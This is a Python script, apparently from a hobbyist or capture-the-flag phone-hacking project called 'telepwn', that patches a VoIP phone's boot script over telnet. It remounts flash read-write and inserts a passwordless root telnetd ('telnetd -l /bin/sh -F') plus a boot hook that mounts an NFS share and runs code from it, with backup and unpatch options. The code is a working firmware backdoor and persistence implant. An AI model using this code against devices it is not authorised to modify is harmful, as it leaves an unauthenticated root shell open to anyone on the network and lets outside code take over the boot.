#!/usr/bin/env python3
"""Deploy the telepwn diversion onto the .85 (appstart-based) firmware in the telnet1
update-stage window.

Boot chain: rcS (loads emac.ko, eth0 up) -> normode.sh -> run_update(=telnetd, telnet1)
-> /phone/scripts/phone.sh -> `appstart -c phone_start.cos ...`.

We patch /phone/scripts/phone.sh (on mtd10 "app", remounted rw) with a single block
right before the `appstart` line: (re)start a passwordless telnetd, then a guarded
diversion hook. Both run after TelnetServices.sh's `killall -9 telnetd`, so telnet
actually sticks, and before appstart so the hook can take over the boot.
The only telepwn artifact staged on flash is divert.sh (the boot bootstrap). Everything
that changes -- the launcher (`run`), the display binary (lcdfb), the flag --
lives in the NFS share the diversion mounts and runs straight from there, so updating a
phone never touches flash. Drop `sunrpc/lockd/nfs` .ko files into hijack/modules/ if the
phone's rootfs does not carry them. Older deploys that staged run.sh/splash.png/lcdfb on
flash are cleaned up on re-run.

Usage:
  deploy85.py PHONE_IP [--server 10.42.0.1] [--host-ip 10.42.0.1] [--stage-only]
              [--divert stage1.sh]
  deploy85.py PHONE_IP --unpatch
"""
import argparse
import glob
import os

from ptelnet import Phone
from push import push_file

HERE = os.path.dirname(os.path.abspath(__file__))
MODULES = os.path.join(HERE, "modules")   # optional sunrpc/lockd/nfs .ko for the mount

DIR = "/phone/telepwn"
PHONE_SH = "/phone/scripts/phone.sh"
# stale flash artifacts from the old design (launcher + display now run from the share)
OBSOLETE = [f"{DIR}/run.sh", f"{DIR}/splash.png", f"{DIR}/lcdfb", f"{DIR}/qget"]
HOOK = f"[ -f {DIR}/divert.sh ] && . {DIR}/divert.sh"
TAG = "# telepwn-hook"
TELNET_BLOCK = [
    "# telepwn-telnet: TelnetServices.sh runs `killall -9 telnetd` earlier in phone.sh",
    "# (features.temode=0 by default), so telnetd only sticks if (re)started *after* it.",
    "# This sits just before the diversion hook -- after TelnetServices.sh -- and before",
    "# the hook, so telnet stays up even when divert.sh blocks in cool mode.",
    "killall telnetd 2>/dev/null; /usr/sbin/telnetd -l /bin/sh -F &  # telepwn-telnet",
]


def read_text(p, path):
    """Read a text file via cat, normalizing CRLF from telnet to LF. phone.sh is plain
    ASCII (no od/xxd on this busybox), so this is faithful."""
    return p.run(f"cat {path}", wait=40).replace("\r\n", "\n").replace("\r", "")


def build_patched(text: str):
    if "telepwn" in text:
        return None  # already patched
    lines = text.split("\n")
    out, injected = [], False
    for ln in lines:
        # telnet (re)start + diversion hook, both right before the appstart launch line,
        # so they run after TelnetServices.sh's killall and before appstart.
        if not injected and "appstart" in ln:
            out.extend(TELNET_BLOCK)
            out.append(f"{HOOK}  {TAG}")
            injected = True
        out.append(ln)
    if not injected:
        raise RuntimeError("no `appstart` line found in phone.sh")
    return "\n".join(out)


def render_divert(server_ip, source="divert.sh"):
    return open(os.path.join(HERE, source)).read().replace("__PROV_SRV__", server_ip)


def deploy(phone_ip, server_ip, host_ip, stage_only, source="divert.sh"):
    divert = render_divert(server_ip, source)
    tmp_divert = os.path.join(HERE, f"__divert_rendered.{os.getpid()}.sh")
    open(tmp_divert, "w").write(divert)
    patched_tmp = os.path.join(HERE, f"__phone_sh_85.{os.getpid()}")
    try:
        with Phone(phone_ip) as p:
            print("[*] remounting /phone rw")
            p.run("mount -o remount,rw /dev/mtdblock10 /phone")

            print("[*] removing obsolete flash artifacts (launcher/display now on share)")
            p.run(f"rm -f {' '.join(OBSOLETE)}")

            print("[*] staging payload ->", DIR)
            # divert.sh is the only telepwn artifact on flash; the launcher, lcdfb and
            # the flag all live in the NFS share and run from there.
            stage = [
                (tmp_divert, f"{DIR}/divert.sh", True),
            ]
            # optional: kernel modules for the NFS mount, if the phone's own rootfs
            # does not carry sunrpc/lockd/nfs where divert.sh can find them.
            modules = glob.glob(os.path.join(MODULES, "*.ko")) if source == "divert.sh" else []
            for ko in sorted(modules):
                stage.append((ko, f"{DIR}/modules/{os.path.basename(ko)}", False))

            for local, remote, chmod in stage:
                if not os.path.exists(local):
                    print(f"  [ ] {remote}: skipped (no local {os.path.basename(local)})")
                    continue
                ok, n, listing = push_file(p, local, remote, host_ip=host_ip, chmod=chmod)
                print(f"  [{'+' if ok else '-'}] {remote}: {listing}")
            chk = p.run(f"sh -n {DIR}/divert.sh && echo OK")
            print(f"[*] divert.sh syntax: {'OK' if 'OK' in chk else 'FAILED'}")

            if stage_only:
                p.run("mount -o remount,ro /phone")
                print("[*] stage-only: payload deployed, phone.sh untouched")
                return

            print("[*] reading + patching phone.sh")
            orig = read_text(p, PHONE_SH)
            print(f"    original phone.sh: {len(orig)} chars")
            patched = build_patched(orig)
            if patched is None:
                print("[*] phone.sh already patched; skipping")
                p.run("mount -o remount,ro /phone")
                return
            open(patched_tmp, "w", newline="\n").write(patched)
            p.run(f"[ -f {PHONE_SH}.telepwn-bak ] || cp {PHONE_SH} {PHONE_SH}.telepwn-bak")
            ok, n, listing = push_file(p, patched_tmp, PHONE_SH)
            p.run(f"chmod 755 {PHONE_SH}")
            print(f"  [{'+' if ok else '-'}] phone.sh ({n} bytes): {listing}")

            syn = p.run(f"sh -n {PHONE_SH} && echo SYNTAX_OK").strip()
            marks = p.run(f"grep -c telepwn {PHONE_SH}").strip()
            print(f"[*] phone.sh syntax: {'OK' if 'SYNTAX_OK' in syn else 'FAILED'}; "
                  f"telepwn lines: {marks}")
            if "SYNTAX_OK" not in syn or not ok:
                print("[-] verification FAILED -- restoring backup")
                p.run(f"cp {PHONE_SH}.telepwn-bak {PHONE_SH}; chmod 755 {PHONE_SH}")
            p.run("mount -o remount,ro /phone")
            print("[*] result (top + hook):")
            print(p.run(f"grep -n telepwn {PHONE_SH}"))
    finally:
        for f in (tmp_divert, patched_tmp):
            if os.path.exists(f):
                os.remove(f)


def unpatch(phone_ip):
    with Phone(phone_ip) as p:
        p.run("mount -o remount,rw /dev/mtdblock10 /phone")
        p.run(f"[ -f {PHONE_SH}.telepwn-bak ] && cp {PHONE_SH}.telepwn-bak {PHONE_SH}; "
              f"chmod 755 {PHONE_SH}")
        syn = p.run(f"sh -n {PHONE_SH} && echo SYNTAX_OK").strip()
        p.run("mount -o remount,ro /phone")
        print(f"[*] restored phone.sh from backup; syntax: {'OK' if 'SYNTAX_OK' in syn else 'FAILED'}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("phone_ip")
    ap.add_argument("--server", default="10.42.0.1")
    ap.add_argument("--host-ip", default="10.42.0.1")
    ap.add_argument("--stage-only", action="store_true")
    ap.add_argument("--unpatch", action="store_true")
    ap.add_argument("--divert", default="divert.sh",
                    help="hook script to install as divert.sh (stage1.sh: USB-stick boot)")
    args = ap.parse_args()
    if args.unpatch:
        unpatch(args.phone_ip)
    else:
        deploy(args.phone_ip, args.server, args.host_ip, args.stage_only, args.divert)


if __name__ == "__main__":
    main()
